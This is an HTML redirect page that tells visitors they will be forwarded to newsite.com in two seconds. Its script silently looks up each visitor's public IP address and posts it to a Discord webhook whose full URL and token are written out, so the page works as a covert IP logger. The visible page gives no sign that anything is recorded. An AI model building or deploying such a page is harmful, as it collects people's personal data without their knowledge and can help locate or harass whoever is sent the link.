<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Redirect after 2 seconds -->
    <meta http-equiv="refresh" content="2;url=https://www.newsite.com">
    <title>Redirecting & Logging IP</title>
</head>
<body>
    <h1>Redirecting...</h1>
    <p>You will be redirected to the new site in 2 seconds.</p>

    <script>
      // IP logging: Fetch the visitor's public IP and send it to your webhook
      fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        fetch('https://discord.com/api/webhooks/1350682115775270963/AAPYhKBmmYV9ZcBb_zKAW-iUiqaypM1Fm83rAaxfJkI2T_jL2e4LYOzOrz0ShDyzsZ3e', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            embeds: [{
              title: "Neuer Besucher",
              description: `IP: ${data.ip}`
            }]
          })
        }).catch(error => console.error('Webhook-Fehler:', error));
      })
      .catch(error => console.error('Fehler beim Abrufen der IP:', error));

      // Optionally, use JavaScript for redirection as well
      setTimeout(function() {
        window.location.href = "https://www.newsite.com";
      }, 2000);
    </script>
</body>
</html>
